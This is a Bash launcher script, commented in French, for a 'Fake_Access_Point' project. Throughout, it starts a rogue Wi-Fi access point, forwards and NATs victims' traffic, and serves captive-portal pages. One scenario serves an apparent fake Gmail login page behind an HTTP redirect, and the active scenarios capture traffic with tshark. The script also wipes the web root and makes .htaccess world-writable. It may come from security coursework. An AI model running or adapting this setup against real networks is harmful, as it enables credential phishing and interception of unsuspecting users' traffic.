#!/bin/bash

#script pour lancer les scénarios au démarrage 
#cela utilise crontab

bool_exec=0

if [[ $bool_exec = 0 ]];then
	exit 0
fi

path=/home/thomas/Desktop/Fake_Access_Point

#valeurs a modifier dans le setup.sh
choice=2
second_choice=1
fap_name=taiste
Int_Wf=wlan0
Int_Af=wlan1
mac="00:c0:ca:b0:2d:26"

sudo $path/stop.sh

sudo ifconfig $Int_Af down
sudo iwconfig $Int_Af mode monitor
sudo ifconfig $Int_Af up

 #on configure l'antene en gw
sudo ifconfig $Int_Af up 192.168.1.1 netmask 255.255.255.0
sudo route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1

#on laisse passer le trafic
sudo iptables -F
sudo iptables --table nat --append POSTROUTING --out-interface $Int_Wf -j MASQUERADE 
sudo iptables --append FORWARD --in-interface $Int_Af -j ACCEPT 
sudo bash -c "echo 1 > /proc/sys/net/ipv4/ip_forward"

sudo systemctl start ssh.service

sleep 5

case $choice in
	1 )
		sudo /usr/sbin/hostapd $path/sc1/hostapd.conf -B
		sudo dnsmasq -C $path/sc1/dnsmasq.conf
		sudo tshark -i $Int_Af -w $path/saves_pcap/test.pcap -q &
		;;
	2 )
		case $second_choice in
			1 )
				sudo cp $path/sc2/conf/000-default.conf /etc/apache2/sites-enabled/000-default.conf
				sudo rm -r /var/www/html/*
				sudo cp -r $path/sc2/portail_captif_sc2.1/* /var/www/html/
				sudo cp $path/sc2/conf/.htaccess /var/www/html/
				sudo chmod 666 /var/www/html/.htaccess
				sudo hostapd $path/sc2/hostapd.conf -B
				sudo $path/sc2/gorb.sh
				sudo $path/sc2/dnsserveropti.py &
				sudo tshark -i $Int_Af -w $path/saves_pcap/test.pcap -q &
				;;
			2 )
				sudo cp $path/sc2/conf/000-default.conf /etc/apache2/sites-enabled/000-default.conf
				sudo rm -r /var/www/html/*
				sudo cp -r $path/sc2/portail_captif_sc2.2/* /var/www/html/
				sudo cp $path/conf/.htaccess /var/www/html/
				sudo chmod 666 /var/www/html/.htaccess
				sudo hostapd $path/sc2/hostapd.conf -B
				sudo $path/sc2/gorb.sh
				sudo $path/sc2/dnsserveropti.py &
				sudo tshark -i $Int_Af -w $path/saves_pcap/test.pcap -q &
				;;
			3 )
				sudo cp $path/sc2/conf/000-default.conf /etc/apache2/sites-enabled/000-default.conf
				sudo rm -r /var/www/html/*
				sudo cp -r $path/sc2/portail_captif_sc2.3/* /var/www/html/
				sudo cp $path/sc2/conf/.htaccess /var/www/html/
				sudo chmod 666 /var/www/html/.htaccess
				sudo hostapd $path/sc2/hostapd.conf -B
				sudo $path/sc2/gorb.sh
				sudo $path/sc2/dnsserveropti.py &
				sudo tshark -i $Int_Af -w $path/saves_pcap/test.pcap -q &
				;;
		esac
		;;
	3 )
		echo "en cours de dev sorry :/"
		;;
	4 )
		sudo iptables -F
	    	sudo iptables -A PREROUTING -t nat -p tcp --dport 80 -j DNAT --to-destination 192.168.1.1
	    	sudo iptables --table nat --append POSTROUTING --out-interface $Int_Wf -j MASQUERADE
	    	sudo iptables --append FORWARD --in-interface $Int_Af -j ACCEPT 
	    	#droits aux fichiers

	    	sudo rm -r /var/www/html/*
	    	sudo rm -f /var/www/html/.htaccess
	    	sudo cp -r $path/sc4/fgmail/* /var/www/html/
	    	sudo cp $path/sc4/conf/.htaccess /var/www/html/.htaccess
			sudo chmod 646 /var/www/html/.htaccess
			sudo hostapd $path/sc4/hostapd.conf -B
	    	sudo dnsmasq -C $path/sc4/dnsmasq.conf
	    	sudo tshark -i $Int_Af -w $path/saves_pcap/test.pcap -q &
		;;
esac
